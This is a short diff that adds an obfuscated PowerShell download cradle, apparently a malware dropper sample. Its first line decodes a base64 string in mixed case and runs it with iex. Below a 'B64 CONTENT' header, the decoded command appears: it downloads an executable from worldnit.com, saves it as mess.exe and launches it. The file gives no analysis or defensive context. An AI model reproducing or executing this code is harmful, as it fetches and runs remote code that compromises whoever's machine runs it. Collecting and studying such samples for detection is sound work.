@@ -1,0 +1,7 @@
+iex([SYsTEM.TeXt.eNCoDINg]::UtF8.geTstriNg([SYStEM.COnVErT]::frOmBaSe64STRInG('CihOZXctT2JqZWN0IFNZU1RlbS5uRXQud0VCY2xJRW50KS5Eb1duTE9hZGZJTGUoJ2h0dHA6Ly93b3JsZG5pdC5jb20vY29tLmV4ZScsJ21lc3MuZXhlJyk7U3RhcnQtUHJvY2VzcyAnbWVzcy5leGUnCgo=')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object SYSTem.nEt.wEBclIEnt).DoWnLOadfILe('http://worldnit.com/com.exe','mess.exe');Start-Process 'mess.exe'
+
